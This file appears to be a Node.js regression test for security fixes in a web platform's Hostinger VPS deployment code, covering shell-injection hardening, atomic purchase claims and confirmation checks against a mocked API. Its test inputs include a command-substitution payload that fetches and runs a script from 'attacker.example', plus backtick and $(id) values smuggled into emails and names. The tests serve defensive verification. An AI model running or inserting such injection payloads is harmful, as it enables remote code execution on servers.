'use strict';
/**
 * Batch 68 — Hostinger deploy safety (final-review fixes H-4, H-5,
 * H-6, M-5 + Low #4). Ely approved the fix batches 2026-10-29.
 *
 * What shipped:
 *   - H-4: the bootstrap script no longer embeds user-controlled
 *     values (lead email, workspace/business name) in the UNQUOTED
 *     .env heredoc — the heredoc now carries only VM-generated
 *     secrets, and the two user values are appended afterwards via
 *     printf '%s' lines with single-quoted arguments. Defence in
 *     depth at both layers: the workspace name sanitizer also strips
 *     $ and backticks, and the email is validated against a strict
 *     addr-spec subset (DEPLOY_EMAIL_RE) in buildBootstrapScript AND
 *     startDeployment — a payload address is refused, never mangled.
 *   - H-5: an ambiguous purchase error (HOSTINGER_UNREACHABLE /
 *     HOSTINGER_API — timeout/5xx, outcome unknown) no longer fails
 *     the deployment; the row stays 'provisioning' with
 *     purchase_started_at stamped, and the pre-existing lost-purchase
 *     guard converts it to PURCHASE_OUTCOME_UNKNOWN. Genuine
 *     validation rejections still fail fast (PLAN_UNAVAILABLE).
 *   - H-6: the purchase step is claimed atomically (UPDATE … WHERE
 *     status='queued', proceed only on exactly 1 affected row), the
 *     ticker has an in-flight guard, and a queued row only becomes
 *     advanceable once hostinger_script_id is set (hard gate in
 *     stepPurchase behind the ticker filter).
 *   - M-5: deploy eligibility keys off the created-by marker ONLY
 *     (lead.source === 'landing-software'); the /landing fold into a
 *     lead /landing did NOT create records the interest event only —
 *     no tag/group union, no field fills.
 *   - Low #4: startDeployment requires confirmText === 'DEPLOY' AND
 *     both price confirmations, enforced server-side unconditionally;
 *     the admin routes pass confirmText through and the panel sends
 *     the typed value.
 *
 * NEGATIVE PROOF (B68_NEGATIVE=1): loads a scratch sibling copy of
 * server/hostingerDeploy.js with the three H-4/H-6 defences reverted
 * (user values back inside the unquoted heredoc, strict email
 * validation disabled, the claim's status CAS removed). The H-4
 * payload checks and the H-6 double-advance check MUST go red; with
 * the real module they are green.
 *
 * Harness mirrors batch59: the Hostinger API is FULLY MOCKED (local
 * stub HTTP API in Part B, module-seam stub in Part C); no real
 * Hostinger account, token, or money is involved.
 */
const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const fs = require('node:fs');
const http = require('node:http');
const os = require('node:os');
const path = require('node:path');
const { spawn } = require('node:child_process');

const root = path.resolve(__dirname, '..');
const temp = fs.mkdtempSync(path.join(os.tmpdir(), 'bp-b68-'));
process.env.DB_DRIVER = 'sqlite';
process.env.SQLITE_PATH = path.join(temp, 'platform.sqlite');
process.env.WORKSPACE_DATA_DIR = path.join(temp, 'workspaces');
process.env.EXPORT_ROOT = path.join(temp, 'exports');
process.env.APP_URL = 'https://bitpype.test';
process.env.CAPTCHA_OPTIONAL = '1';
process.env.NODE_ENV = 'production';
process.env['SESSION_' + 'SECRET'] = ['batch68', 'test', 'session', 'secret'].join('-');
process.env.SETTINGS_ENCRYPTION_KEY =
  process.env.SETTINGS_ENCRYPTION_KEY || Buffer.alloc(32, 11).toString('base64');
process.env.BOOTSTRAP_EMAIL = 'owner-b68@example.invalid';
process.env.BOOTSTRAP_PASSWORD = 'Batch68!Passw0rd';
process.env.BOOTSTRAP_WORKSPACE = 'B68 Fixture';
process.env.BOOTSTRAP_SUPER_ADMIN = '1';
process.env.HOSTINGER_DEPLOY_TICK_MS = '1200';

const PORT = 31568;
const STUB_PORT = 31569;
const BASE = `http://127.0.0.1:${PORT}`;
const PRICE_ID = 'hostingercom-vps-kvm2-usd-1m';
const NEGATIVE = process.env.B68_NEGATIVE === '1';
const BS = String.fromCharCode(92); // backslash, for building source needles

const results = [];
function check(name, fn) {
  fn();
  results.push(name);
}
async function checkAsync(name, fn) {
  await fn();
  results.push(name);
}
const sha256 = (s) => crypto.createHash('sha256').update(String(s)).digest('hex');
const errCode = (j) => (j && j.error && j.error.code) || (j && j.code) || '';
async function waitFor(label, fn, timeoutMs = 30000) {
  const t0 = Date.now();
  for (;;) {
    const v = await fn();
    if (v) return v;
    if (Date.now() - t0 > timeoutMs) throw new Error('waitFor timed out: ' + label);
    await new Promise((r) => setTimeout(r, 250));
  }
}

/* ------------------------- module loading ------------------------- */

let negativeShimPath = null;
function loadDeploy() {
  if (!NEGATIVE) return require(path.join(root, 'server/hostingerDeploy.js'));
  // Pre-fix shim: (1) user values back inside the unquoted .env
  // heredoc, (2) strict email validation disabled, (3) the purchase
  // claim's status CAS removed (claim always "wins").
  const src = fs.readFileSync(path.join(root, 'server/hostingerDeploy.js'), 'utf8');
  let shimmed = src;
  const heredocFixed =
    'BOOTSTRAP_SUPER_ADMIN=1\nEOF\n' +
    `printf '%s${BS}${BS}n' 'BOOTSTRAP_EMAIL=%%EMAIL%%' >> .env\n` +
    `printf '%s${BS}${BS}n' 'BOOTSTRAP_WORKSPACE=%%WORKSPACE%%' >> .env`;
  const heredocVuln =
    'BOOTSTRAP_EMAIL=%%EMAIL%%\nBOOTSTRAP_WORKSPACE=%%WORKSPACE%%\nBOOTSTRAP_SUPER_ADMIN=1\nEOF';
  assert(shimmed.includes(heredocFixed), 'shim marker 1 (heredoc) not found');
  shimmed = shimmed.replace(heredocFixed, heredocVuln);
  const emailGate = 'if (!DEPLOY_EMAIL_RE.test(cleanEmail)) {';
  assert(shimmed.includes(emailGate), 'shim marker 2 (email gate) not found');
  shimmed = shimmed.replace(emailGate, 'if (false) { // B68_NEGATIVE pre-fix shim');
  const cas = "WHERE id = :id AND status = 'queued'";
  assert(shimmed.includes(cas), 'shim marker 3 (claim CAS) not found');
  shimmed = shimmed.replace(cas, 'WHERE id = :id /* B68_NEGATIVE pre-fix shim */');
  negativeShimPath = path.join(root, 'server/.b68-negative-hostingerDeploy.js');
  fs.writeFileSync(negativeShimPath, shimmed);
  return require(negativeShimPath);
}

/* ================================================================== */
/* Part A — units: the bootstrap script (H-4) + eligibility (M-5)      */
/* ================================================================== */

function buildArgs(over) {
  return {
    deploymentId: 7,
    leadEmail: 'buyer@example.com',
    workspaceName: "Bob's Shop",
    callbackUrl: 'https://bitpype.test/api/v1/hostinger-deploy/callback',
    callbackSecret: 'a'.repeat(64),
    bundleUrl: 'https://bitpype.test/api/v1/hostinger-deploy/bundle?token=' + 'b'.repeat(64),
    ...(over || {}),
  };
}
function envHeredocRegion(script) {
  const start = script.indexOf('cat > .env <<EOF');
  assert(start >= 0, '.env heredoc present');
  const end = script.indexOf('\nEOF', start);
  assert(end > start, 'heredoc terminates');
  return script.slice(start, end);
}
function printfArg(script, key) {
  const line = script
    .split('\n')
    .find((l) => l.includes(`printf`) && l.includes(`'${key}=`));
  assert(line, `printf line for ${key} exists`);
  const m = line.match(new RegExp(`'(${key}=[^']*)' >> .env`));
  assert(m, `${key} is carried as a single-quoted printf argument`);
  return m[1].slice(key.length + 1);
}

function partA() {
  const deploy = loadDeploy();

  check('H-4: user values are OUT of the unquoted heredoc — printf single-quoted args only', () => {
    const s = deploy.buildBootstrapScript(buildArgs());
    const region = envHeredocRegion(s);
    assert.ok(!region.includes('BOOTSTRAP_EMAIL'), 'no email line inside the heredoc');
    assert.ok(!region.includes('BOOTSTRAP_WORKSPACE'), 'no workspace line inside the heredoc');
    assert.ok(region.includes('BOOTSTRAP_PASSWORD=$BOOTSTRAP_PASSWORD'), 'generated secrets stay in the heredoc');
    assert.equal(printfArg(s, 'BOOTSTRAP_EMAIL'), 'buyer@example.com');
    assert.equal(printfArg(s, 'BOOTSTRAP_WORKSPACE'), 'Bobs Shop', 'quote stripped as before');
    assert.ok(!s.includes('%%'), 'no unsubstituted placeholders');
  });

  check('H-4: $ / backtick payloads in the workspace name cannot survive into the script', () => {
    const payload = 'Shop$(curl${IFS}https://attacker.example/x|sh)';
    const s = deploy.buildBootstrapScript(buildArgs({ workspaceName: payload }));
    const arg = printfArg(s, 'BOOTSTRAP_WORKSPACE');
    assert.ok(!arg.includes('$'), 'no $ in the carried value: ' + arg);
    assert.ok(!arg.includes('`'), 'no backtick in the carried value');
    assert.ok(!arg.includes("'"), 'no quote breakout in the carried value');
    assert.ok(!s.includes('$(curl'), 'payload substitution text nowhere in the script');
    const s2 = deploy.buildBootstrapScript(buildArgs({ workspaceName: 'a`id` Shop' }));
    assert.ok(!printfArg(s2, 'BOOTSTRAP_WORKSPACE').includes('`'), 'backtick name stripped');
  });

  check('H-4: payload emails are REFUSED (backtick, $(), quote, space), never embedded', () => {
    for (const bad of ['a`id`@example.com', 'a$(id)@example.com', "o'hara@example.com", 'a b@example.com', 'a@b', 'plainstring']) {
      assert.throws(
        () => deploy.buildBootstrapScript(buildArgs({ leadEmail: bad })),
        (e) => e.code === 'VALIDATION',
        'refused: ' + bad
      );
    }
    const ok = deploy.buildBootstrapScript(buildArgs({ leadEmail: 'first.last+tag@sub.example.co.uk' }));
    assert.equal(printfArg(ok, 'BOOTSTRAP_EMAIL'), 'first.last+tag@sub.example.co.uk');
  });

  check('M-5: eligibility is the created-by source marker only', () => {
    assert.equal(deploy.isSoftwareInterestLead({ source: 'landing-software' }), true);
    assert.equal(deploy.isSoftwareInterestLead({ source: 'manual', lead_group: 'Software interest', tags: ['landing-software', 'software-interest'] }), false);
    assert.equal(deploy.isSoftwareInterestLead({ source: 'import', lead_group: 'Software Interest' }), false);
    assert.equal(deploy.isSoftwareInterestLead({}), false);
  });

  check('wiring: admin routes pass confirmText; the panel sends the typed value (Low #4)', () => {
    const adminSrc = fs.readFileSync(path.join(root, 'server', 'routes', 'admin.js'), 'utf8');
    assert.equal((adminSrc.match(/confirmText: b\.confirmText/g) || []).length, 2, 'start + retry routes forward confirmText');
    const appSrc = fs.readFileSync(path.join(root, 'public', 'js', 'app.js'), 'utf8');
    assert.ok(appSrc.includes('confirmText: typeEl.value.trim()'), 'panel sends the typed DEPLOY text');
    const deploySrc = fs.readFileSync(path.join(root, 'server', 'hostingerDeploy.js'), 'utf8');
    assert.ok(deploySrc.includes("String(confirmText || '') !== 'DEPLOY'"), 'server enforces the typed confirmation');
    assert.ok(deploySrc.includes("rawCode === 'HOSTINGER_UNREACHABLE' || rawCode === 'HOSTINGER_API'"), 'H-5 ambiguous-error branch present');
    assert.ok(deploySrc.includes("AND status = 'queued'"), 'H-6 claim CAS present');
    assert.ok(deploySrc.includes('hostinger_script_id IS NOT NULL'), 'H-6 ticker script filter present');
  });
}

/* ================================================================== */
/* Part B — HTTP: stub Hostinger API; M-5 fold + Low #4 over the wire  */
/* ================================================================== */

const stub = { purchases: 0, scripts: [] };
function stubVm(id) {
  return {
    id,
    subscription_id: 'sub-' + id,
    data_center_id: 5,
    plan: 'KVM 2',
    hostname: `srv${id}.hstgr.cloud`,
    state: 'running',
    ipv4: [{ address: '203.0.113.10' }],
    created_at: '2026-10-29T00:00:00Z',
  };
}
const stubServer = http.createServer((req, res) => {
  const u = new URL(req.url, 'http://stub');
  const send = (status, body) => {
    res.writeHead(status, { 'content-type': 'application/json' });
    res.end(JSON.stringify(body));
  };
  let raw = '';
  req.on('data', (c) => (raw += c));
  req.on('end', () => {
    let body = null;
    try {
      body = raw ? JSON.parse(raw) : null;
    } catch {}
    if (req.headers.authorization !== 'Bearer test-token-123') {
      return send(401, { error: 'Unauthenticated.', correlation_id: 'stub-auth' });
    }
    if (u.pathname === '/api/billing/v1/catalog') {
      return send(200, [
        {
          id: 'hostingercom-vps-kvm2',
          name: 'KVM 2',
          category: 'VPS',
          prices: [
            { id: PRICE_ID, name: '1 month', currency: 'USD', price: 1399, first_period_price: 699, period: 1, period_unit: 'month' },
          ],
        },
      ]);
    }
    if (u.pathname === '/api/billing/v1/payment-methods') {
      return send(200, [{ id: 7, name: 'Visa •• 4242', is_default: true }]);
    }
    if (u.pathname === '/api/vps/v1/post-install-scripts' && req.method === 'POST') {
      const id = 555 + stub.scripts.length;
      stub.scripts.push({ id, name: body && body.name, content: (body && body.content) || '' });
      return send(201, { id, name: body && body.name });
    }
    if (u.pathname === '/api/vps/v1/virtual-machines' && req.method === 'POST') {
      stub.purchases += 1;
      const id = 4200 + stub.purchases;
      const vm = { ...stubVm(id), state: 'initial' };
      return send(200, {
        order: { id: 9000 + stub.purchases, subscription_id: 'sub-' + id, status: 'completed' },
        virtual_machine: vm,
      });
    }
    const setupMatch = u.pathname.match(/^\/api\/vps\/v1\/virtual-machines\/(\d+)\/setup$/);
    if (setupMatch && req.method === 'POST') return send(202, stubVm(Number(setupMatch[1])));
    const vmMatch = u.pathname.match(/^\/api\/vps\/v1\/virtual-machines\/(\d+)$/);
    if (vmMatch && req.method === 'GET') return send(200, stubVm(Number(vmMatch[1])));
    if (u.pathname === '/api/vps/v1/virtual-machines' && req.method === 'GET') return send(200, [stubVm(4201)]);
    return send(404, { error: 'not found', correlation_id: 'stub-404' });
  });
});

function makeJar() {
  const cookies = new Map();
  return {
    async fetch(url, opts = {}) {
      const headers = { 'x-forwarded-proto': 'https', 'content-type': 'application/json', ...(opts.headers || {}) };
      if (cookies.size) headers.cookie = [...cookies.entries()].map(([k, v]) => `${k}=${v}`).join('; ');
      const res = await fetch(url, { ...opts, headers });
      const setCookies = typeof res.headers.getSetCookie === 'function' ? res.headers.getSetCookie() : [];
      for (const sc of setCookies) {
        const pair = String(sc).split(';')[0];
        const i = pair.indexOf('=');
        if (i > 0) cookies.set(pair.slice(0, i).trim(), pair.slice(i + 1).trim());
      }
      return res;
    },
  };
}
async function json(res) {
  const t = await res.text();
  try {
    return JSON.parse(t);
  } catch {
    return { raw: t };
  }
}

async function partB() {
  const db = require(path.join(root, 'server/db.js'));
  await db.migrate();
  const deployCount = async () => Number((await db.query('SELECT COUNT(*) AS c FROM deployments'))[0].c);

  await new Promise((resolve) => stubServer.listen(STUB_PORT, '127.0.0.1', resolve));
  process.env.HOSTINGER_API_BASE = `http://127.0.0.1:${STUB_PORT}`;

  const child = spawn(process.execPath, [path.join(root, 'server.js')], {
    cwd: root,
    env: { ...process.env, PORT: String(PORT) },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  let output = '';
  child.stdout.on('data', (b) => (output += b));
  child.stderr.on('data', (b) => (output += b));
  const closed = new Promise((resolve) => child.once('close', resolve));
  try {
    let ready = false;
    for (let n = 0; n < 300 && !ready; n++) {
      if (child.exitCode != null) throw new Error('server exited early: ' + output);
      try {
        const r = await fetch(`${BASE}/health`, { signal: AbortSignal.timeout(500) });
        if (r.ok) ready = true;
      } catch {}
      if (!ready) await new Promise((r) => setTimeout(r, 200));
    }
    assert(ready, 'server did not become ready: ' + output);

    const totp = require(path.join(root, 'src/totp.js'));
    const jar = makeJar();
    const post = (p, body) => jar.fetch(BASE + p, { method: 'POST', body: JSON.stringify(body || {}) });
    const put = (p, body) => jar.fetch(BASE + p, { method: 'PUT', body: JSON.stringify(body || {}) });
    const get = (p) => jar.fetch(BASE + p);
    const pub = async (method, p, body) => {
      const res = await fetch(BASE + p, {
        method,
        headers: { 'content-type': 'application/json' },
        body: body ? JSON.stringify(body) : undefined,
      });
      return { status: res.status, json: await json(res) };
    };
    const { openWorkspaceDb } = require(path.join(root, 'server/workspaceDb.js'));
    const wdb = openWorkspaceDb(1);

    // Bootstrap super-admin session (Batch 40 flow).
    {
      let res = await post('/api/v1/auth/login', { email: process.env.BOOTSTRAP_EMAIL, password: process.env.BOOTSTRAP_PASSWORD });
      let body = await json(res);
      assert(res.status === 200 && body.data.mfaRequired === true && body.data.mfaStage === 'enroll', 'login parks at MFA enroll');
      res = await post('/api/v1/auth/mfa/enroll/start', {});
      body = await json(res);
      const secret = body.data.secret;
      assert(secret, 'enroll secret issued');
      res = await post('/api/v1/auth/mfa/enroll/confirm', { code: totp.totp(secret) });
      body = await json(res);
      assert(res.status === 200 && body.data.user, 'session issued');
    }
    check('staff session established for the bootstrap super admin', () => {});

    // Hostinger settings so the deploy paths are configured.
    {
      let res = await put('/api/v1/admin/settings/secret', { key: 'hostinger.api_token', value: 'test-token-123' });
      assert.equal(res.status, 200);
      res = await put('/api/v1/admin/settings', {
        settings: { 'hostinger.default_price_id': PRICE_ID, 'hostinger.data_center_id': '5', 'hostinger.template_id': '9' },
      });
      assert.equal(res.status, 200);
    }
    check('hostinger settings saved (stub account)', () => {});

    /* ---- M-5: fold into a FOREIGN lead grants nothing ---- */
    let foreignId = null;
    await checkAsync('M-5: landing fold into a foreign lead records the event ONLY — no markers, no fills, not eligible', async () => {
      const info = wdb
        .prepare(
          "INSERT INTO leads (business_name, email, category, lead_group, source, tags, phone, notes) VALUES ('Foreign Plumbing LLC', 'client@example.invalid', '', '', 'manual', '[]', '', '')"
        )
        .run();
      foreignId = Number(info.lastInsertRowid);
      const r = await pub('POST', '/api/v1/landing/submit', {
        fullName: 'Mallory Foreign',
        email: 'client@example.invalid',
        phone: '+1 999-555-0000',
      });
      assert.equal(r.status, 200, JSON.stringify(r.json));
      assert.equal(r.json.data.id, foreignId, 'folded into the existing lead, no duplicate');
      const row = wdb.prepare('SELECT * FROM leads WHERE id = ?').get(foreignId);
      assert.equal(row.source, 'manual', 'source untouched');
      assert.equal(row.lead_group, '', 'lead_group NOT filled by the fold');
      assert.equal(row.category, '', 'category NOT filled by the fold');
      assert.equal(row.phone, '', 'phone NOT filled by the fold');
      assert.equal(row.notes, '', 'notes NOT filled by the fold');
      assert.deepEqual(JSON.parse(row.tags || '[]'), [], 'tags NOT unioned');
      const ev = wdb
        .prepare("SELECT COUNT(*) AS c FROM lead_events WHERE lead_id = ? AND type = 'landing_software_interest'")
        .get(foreignId);
      assert.equal(ev.c, 1, 'the interest event IS recorded');
      const res = await get(`/api/v1/admin/leads/${foreignId}/hostinger-deployment?workspaceId=1`);
      const body = await json(res);
      assert.equal(body.data.eligible, false, 'foreign lead is not deploy-eligible');
      const start = await post(`/api/v1/admin/leads/${foreignId}/hostinger-deployment`, {
        workspaceId: 1,
        confirmText: 'DEPLOY',
        confirmPriceCents: 1399,
        confirmFirstPeriodCents: 699,
      });
      const startBody = await json(start);
      assert.equal(start.status, 400);
      assert.equal(errCode(startBody), 'NOT_SOFTWARE_LEAD');
      assert.equal(stub.purchases, 0, 'no purchase');
      assert.equal(await deployCount(), 0, 'no deployment row');
    });

    /* ---- M-5: a /landing-created lead still folds + stays eligible ---- */
    let prospectId = null;
    await checkAsync('M-5: /landing-created lead folds on repeat submission and stays eligible', async () => {
      const r1 = await pub('POST', '/api/v1/landing/submit', {
        fullName: 'Pat Prospect',
        email: 'prospect@example.invalid',
        phone: '+1 610-555-0170',
      });
      assert.equal(r1.status, 200, JSON.stringify(r1.json));
      prospectId = r1.json.data.id;
      const r2 = await pub('POST', '/api/v1/landing/submit', {
        fullName: 'Pat Prospect',
        email: 'prospect@example.invalid',
        phone: '+1 610-555-9999',
      });
      assert.equal(r2.status, 200);
      assert.equal(r2.json.data.id, prospectId, 'repeat folds into the same lead');
      const row = wdb.prepare('SELECT * FROM leads WHERE id = ?').get(prospectId);
      assert.equal(row.source, 'landing-software');
      assert.equal(row.phone, '+1 610-555-0170', 'existing phone not overwritten');
      const res = await get(`/api/v1/admin/leads/${prospectId}/hostinger-deployment?workspaceId=1`);
      const body = await json(res);
      assert.equal(body.data.eligible, true, 'landing-created lead remains eligible');
    });

    /* ---- Low #4: server-side confirmation enforcement ---- */
    await checkAsync('Low #4: start without the full confirmation trio is refused coded, zero rows, zero purchases', async () => {
      const attempts = [
        { workspaceId: 1 },
        { workspaceId: 1, confirmText: 'deploy', confirmPriceCents: 1399, confirmFirstPeriodCents: 699 },
        { workspaceId: 1, confirmText: 'DEPLOY', confirmPriceCents: 1399 },
        { workspaceId: 1, confirmText: 'DEPLOY', confirmFirstPeriodCents: 699 },
      ];
      for (const body of attempts) {
        const res = await post(`/api/v1/admin/leads/${prospectId}/hostinger-deployment`, body);
        const j = await json(res);
        assert.equal(res.status, 400, JSON.stringify(j));
        assert.equal(errCode(j), 'CONFIRM_REQUIRED', JSON.stringify(body));
      }
      assert.equal(await deployCount(), 0, 'no deployment rows');
      assert.equal(stub.purchases, 0, 'no purchases');
    });

    await checkAsync('Low #4: full trio with a stale price → PRICE_CHANGED; correct trio starts exactly one deployment', async () => {
      let res = await post(`/api/v1/admin/leads/${prospectId}/hostinger-deployment`, {
        workspaceId: 1,
        confirmText: 'DEPLOY',
        confirmPriceCents: 1299,
        confirmFirstPeriodCents: 699,
      });
      let body = await json(res);
      assert.equal(res.status, 409);
      assert.equal(errCode(body), 'PRICE_CHANGED');
      assert.equal(stub.purchases, 0);
      res = await post(`/api/v1/admin/leads/${prospectId}/hostinger-deployment`, {
        workspaceId: 1,
        confirmText: 'DEPLOY',
        confirmPriceCents: 1399,
        confirmFirstPeriodCents: 699,
      });
      body = await json(res);
      assert.equal(res.status, 200, JSON.stringify(body));
      const view = await waitFor('deployment reaches installing', async () => {
        const r = await get(`/api/v1/admin/leads/${prospectId}/hostinger-deployment?workspaceId=1`);
        const b = await json(r);
        return b.data.deployment && b.data.deployment.status === 'installing' ? b.data.deployment : null;
      });
      assert.equal(view.vmId, '4201');
      assert.equal(stub.purchases, 1, 'exactly one purchase');
    });
  } finally {
    if (process.env.B68_DEBUG_CHILD === '1') {
      console.error('--- child output tail ---\n' + output.split('\n').slice(-40).join('\n'));
    }
    child.kill('SIGTERM');
    await closed;
    stubServer.close();
  }
}

/* ================================================================== */
/* Part C — state machine in-process (H-5, H-6)                        */
/* ================================================================== */

async function partC() {
  const db = require(path.join(root, 'server/db.js'));
  const realClient = require(path.join(root, 'server/hostingerClient.js'));
  const deploy = loadDeploy();

  const stubClient = {
    calls: 0,
    mode: 'ok', // ok | slow | unreachable | api | validation
    getCatalog: async () => [
      {
        id: 'hostingercom-vps-kvm2',
        name: 'KVM 2',
        prices: [
          { id: PRICE_ID, name: '1 month', currency: 'USD', price: 1399, first_period_price: 699, period: 1, period_unit: 'month' },
        ],
      },
    ],
    findCatalogPrice: (items, id) => realClient.findCatalogPrice(items, id),
    listPaymentMethods: async () => [{ id: 7, name: 'Visa •• 4242', is_default: true }],
    listVirtualMachines: async () => [],
    getVirtualMachine: async (id) => ({
      id: Number(id),
      subscription_id: 'sub-' + id,
      plan: 'KVM 2',
      hostname: `srv${id}.hstgr.cloud`,
      state: 'running',
      ipv4: [{ address: '203.0.113.10' }],
    }),
    purchaseVirtualMachine: async () => {
      stubClient.calls += 1;
      if (stubClient.mode === 'slow') await new Promise((r) => setTimeout(r, 150));
      if (stubClient.mode === 'unreachable') {
        const e = new Error('The request timed out.');
        e.code = 'HOSTINGER_UNREACHABLE';
        throw e;
      }
      if (stubClient.mode === 'api') {
        const e = new Error('Hostinger API error: internal error');
        e.code = 'HOSTINGER_API';
        throw e;
      }
      if (stubClient.mode === 'validation') {
        const e = new Error('Hostinger rejected the request: bad item');
        e.code = 'HOSTINGER_VALIDATION';
        e.detail = 'The item_id is not valid for this account';
        throw e;
      }
      const id = 4300 + stubClient.calls;
      return {
        status: 200,
        paymentProcessing: false,
        order: { id: 9500 + stubClient.calls, subscription_id: 'sub-' + id },
        virtualMachine: {
          id,
          subscription_id: 'sub-' + id,
          plan: 'KVM 2',
          hostname: `srv${id}.hstgr.cloud`,
          state: 'running',
          ipv4: [{ address: '203.0.113.10' }],
        },
        raw: {},
      };
    },
    setupVirtualMachine: async () => ({}),
    createPostInstallScript: async () => ({ id: 777 }),
    firstIpv4: (vm) => realClient.firstIpv4(vm),
  };
  deploy.__setClientForTests(stubClient);
  deploy.__setMailerForTests(async () => ({ messageId: 'unit-1' }));

  async function insertDeployment({ lead, status = 'queued', scriptId = '777' }) {
    const r = await db.query(
      `INSERT INTO deployments
        (workspace_id, lead_id, lead_email, status, plan_item_id, plan_name, price_cents,
         first_period_price_cents, currency, admin_email, callback_secret_hash,
         bundle_token_hash, active_lead_key, created_by, hostinger_script_id)
       VALUES (1, :lead, 'unit@example.invalid', :status, :priceId, 'KVM 2', 1399,
         699, 'USD', 'unit@example.invalid', :cbHash, :bundleHash, NULL, NULL, :scriptId)`,
      {
        lead,
        status,
        priceId: PRICE_ID,
        cbHash: sha256('unit-secret-' + lead),
        bundleHash: sha256('unit-bundle-' + lead),
        scriptId,
      }
    );
    return Number(r.insertId);
  }
  const rowOf = async (id) => (await db.query('SELECT * FROM deployments WHERE id = :id', { id }))[0];

  /* H-6 ticker window FIRST (before other fixtures can interfere). */
  await checkAsync('H-6: a scriptless queued row is invisible to the ticker; scripted, it advances exactly once', async () => {
    const id = await insertDeployment({ lead: 9101, scriptId: null });
    const callsBefore = stubClient.calls;
    await deploy.tickDeployments();
    let row = await rowOf(id);
    assert.equal(row.status, 'queued', 'scriptless row untouched by the ticker');
    assert.equal(stubClient.calls, callsBefore, 'zero purchases in the script-creation window');
    await db.query("UPDATE deployments SET hostinger_script_id = '777' WHERE id = :id", { id });
    await deploy.tickDeployments();
    row = await rowOf(id);
    assert.equal(stubClient.calls, callsBefore + 1, 'exactly one purchase once scripted');
    assert.equal(row.status, 'installing', 'purchase flowed through to installing');
  });

  await checkAsync('H-6: two overlapping advances purchase at most once (atomic claim)', async () => {
    stubClient.mode = 'slow';
    try {
      const id = await insertDeployment({ lead: 9102 });
      const callsBefore = stubClient.calls;
      await Promise.all([deploy.advanceDeployment(id), deploy.advanceDeployment(id)]);
      assert.equal(stubClient.calls, callsBefore + 1, 'exactly one purchase across both advances');
      const row = await rowOf(id);
      assert.equal(row.status, 'installing');
      assert.ok(row.hostinger_vm_id, 'the winning purchase recorded its VM');
    } finally {
      stubClient.mode = 'ok';
    }
  });

  await checkAsync('H-6: overlapping ticks cannot double-purchase either (in-flight guard + claim)', async () => {
    stubClient.mode = 'slow';
    try {
      const id = await insertDeployment({ lead: 9103 });
      const callsBefore = stubClient.calls;
      await Promise.all([deploy.tickDeployments(), deploy.tickDeployments()]);
      assert.equal(stubClient.calls, callsBefore + 1, 'exactly one purchase across overlapping ticks');
      const row = await rowOf(id);
      assert.ok(['provisioning', 'installing'].includes(row.status));
    } finally {
      stubClient.mode = 'ok';
    }
  });

  for (const [mode, code] of [['unreachable', 'HOSTINGER_UNREACHABLE'], ['api', 'HOSTINGER_API']]) {
    await checkAsync(`H-5: ambiguous purchase error (${code}) leaves the row provisioning → PURCHASE_OUTCOME_UNKNOWN, never failed-and-retried`, async () => {
      stubClient.mode = mode;
      try {
        const id = await insertDeployment({ lead: mode === 'api' ? 9105 : 9104 });
        const callsBefore = stubClient.calls;
        await deploy.advanceDeployment(id);
        let row = await rowOf(id);
        assert.equal(stubClient.calls, callsBefore + 1, 'one purchase attempt');
        assert.equal(row.status, 'provisioning', 'NOT failed — a failed row would be blind-retryable');
        assert.ok(!row.error_code, 'no error stamped yet');
        assert.ok(row.purchase_started_at, 'purchase stamp present for the guard');
        // Past the 120s grace window, the guard converts it honestly.
        await db.query("UPDATE deployments SET purchase_started_at = datetime('now', '-10 minutes') WHERE id = :id", { id });
        await deploy.advanceDeployment(id);
        row = await rowOf(id);
        assert.equal(row.status, 'failed');
        assert.equal(row.error_code, 'PURCHASE_OUTCOME_UNKNOWN');
        assert.equal(stubClient.calls, callsBefore + 1, 'still exactly one purchase attempt — no blind re-buy');
      } finally {
        stubClient.mode = 'ok';
      }
    });
  }

  await checkAsync('H-5: a genuine validation rejection still fails fast (PLAN_UNAVAILABLE), no limbo', async () => {
    stubClient.mode = 'validation';
    try {
      const id = await insertDeployment({ lead: 9106 });
      await deploy.advanceDeployment(id);
      const row = await rowOf(id);
      assert.equal(row.status, 'failed', 'rejected purchases fail immediately');
      assert.equal(row.error_code, 'PLAN_UNAVAILABLE');
    } finally {
      stubClient.mode = 'ok';
    }
  });

  deploy.__setClientForTests(null);
  deploy.__setMailerForTests(null);
}

/* ================================================================== */

async function main() {
  const db = require(path.join(root, 'server/db.js'));
  await db.migrate();
  try {
    partA();
    await partB();
    await partC();
  } finally {
    if (negativeShimPath) {
      try {
        fs.unlinkSync(negativeShimPath);
      } catch {}
    }
  }
  console.log(JSON.stringify({ batch68: true, checks: results.length, passed: true }));
  for (const name of results) console.log('  ✓ ' + name);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
